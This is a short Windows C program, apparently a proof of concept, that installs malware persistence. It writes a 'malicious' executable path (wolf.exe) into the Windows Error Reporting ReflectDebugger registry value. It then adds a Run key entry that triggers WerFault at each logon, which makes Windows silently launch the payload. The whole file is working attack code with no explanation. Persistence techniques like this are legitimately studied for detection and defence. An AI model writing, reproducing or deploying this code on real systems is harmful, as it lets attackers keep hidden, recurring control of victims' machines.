#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  //恶意可执行程序路径
  const char* exe = "C:\\Users\\Administrator\\Desktop\\test\\malicious\\pre\\wolf.exe";

  const char* wf = "WerFault.exe -pr 1";
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting\\Hangs", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"ReflectDebugger", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
    RegCloseKey(hkey);
  }

  res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    RegSetValueEx(hkey, (LPCSTR)"WOLF", 0, REG_SZ, (unsigned char*)wf, strlen(wf));
    RegCloseKey(hkey);
  }
  return 0;
}
